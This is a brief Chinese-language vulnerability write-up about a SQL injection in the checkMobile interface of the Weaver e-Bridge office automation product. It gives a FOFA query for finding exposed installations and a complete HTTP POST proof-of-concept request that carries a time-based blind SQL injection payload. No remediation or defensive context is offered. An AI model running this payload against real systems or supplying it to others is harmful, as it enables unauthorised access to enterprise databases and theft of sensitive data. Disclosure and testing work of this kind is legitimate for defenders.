# 泛微云桥e-Bridge系统checkMobile存在SQL注入漏洞
泛微云桥e-Bridge 是一款办公自动化工具，主要提供文档管理、流程管理、协同办公、知识管理和移动办公等功能。它的目标是将企业内部的各种业务流程数字化，并通过云端技术实现跨部门、跨地域的协同办公和信息共享。该产品 checkMobile接口存在SQL注入漏洞，通过此漏洞攻击者可获取企业数据库敏感数据。

## fofa
```javascript
app="泛微-云桥e-Bridge"
```

## poc
```javascript
POST /taste/checkMobile?company=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX&openid=1&source=1&userName=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1734314946886-bc51d38e-16bd-4416-aa8c-56e40e24692a.png)

